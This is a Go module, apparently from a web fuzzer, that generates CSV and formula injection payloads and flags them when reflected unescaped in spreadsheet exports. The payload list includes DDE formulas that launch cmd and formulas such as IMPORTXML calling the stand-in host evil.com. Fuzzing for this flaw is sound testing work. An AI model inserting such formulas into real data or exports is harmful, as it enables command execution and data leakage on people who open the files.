package vulns

import (
	"strings"

	"github.com/renansj/ryofuzz/internal/input"
	"github.com/renansj/ryofuzz/internal/mutator"
)

type CSVInjectModule struct{}

func (m *CSVInjectModule) Name() string        { return "csv" }
func (m *CSVInjectModule) Description() string { return "CSV/Formula Injection" }

func (m *CSVInjectModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload

	csvPayloads := []struct {
		value   string
		variant string
	}{
		{"=cmd|'/C calc'!A1", "dde-cmd"},
		{"@SUM(1+1)*cmd|'/C calc'!A1", "dde-at-sum"},
		{"+cmd|'/C calc'!A1", "dde-plus"},
		{"-cmd|'/C calc'!A1", "dde-minus"},
		{"=HYPERLINK(\"http://evil.com\")", "hyperlink"},
		{"=IMPORTXML(\"http://evil.com\",\"//a\")", "importxml"},
		{"\t=cmd|'/C calc'!A1", "dde-tab-prefix"},
		{"\r\n=cmd|'/C calc'!A1", "dde-newline"},
		{"=1+1", "formula-simple"},
		{"@SUM(A1:A100)", "at-formula"},
		{"+1+1", "plus-formula"},
		{"-1+1", "minus-formula"},
		{"=MSEXCEL|'\\..\\..\\..\\Windows\\System32\\cmd'!'\\c calc'", "dde-msexcel"},
	}

	for _, point := range points {
		for _, p := range csvPayloads {
			payloads = append(payloads, mutator.Payload{
				Value: p.value, Point: point, Module: "csv", Variant: p.variant,
			})
		}
	}
	return payloads
}

func (m *CSVInjectModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {

	// Check Content-Type for CSV/spreadsheet
	isCSV := false
	for _, ct := range respHeaders["Content-Type"] {
		lower := strings.ToLower(ct)
		if strings.Contains(lower, "csv") || strings.Contains(lower, "spreadsheet") ||
			strings.Contains(lower, "excel") || strings.Contains(lower, "ms-excel") {
			isCSV = true
			break
		}
	}

	if !isCSV {
		return nil
	}

	// Check if payload is reflected without sanitization
	dangerChars := []string{"=", "+", "-", "@"}
	reflected := false
	for _, ch := range dangerChars {
		if strings.HasPrefix(payload.Value, ch) && strings.Contains(respBody, payload.Value) {
			reflected = true
			break
		}
	}

	// Also check partial reflection (the formula part)
	if !reflected && strings.Contains(respBody, "cmd|") {
		reflected = true
	}

	if reflected {
		return &Finding{
			Module:      "csv",
			Severity:    "high",
			Confidence:  "high",
			Title:       "CSV Injection - Formula reflected in export",
			Description: "Dangerous formula characters are included in CSV output without sanitization",
			Payload:     payload.Value,
			Point:       payload.Point,
			Evidence:    "Payload reflected in CSV/spreadsheet response without escaping",
			OWASP:       "A03:2021",
			CWE:         "CWE-1236",
		}
	}

	return nil
}
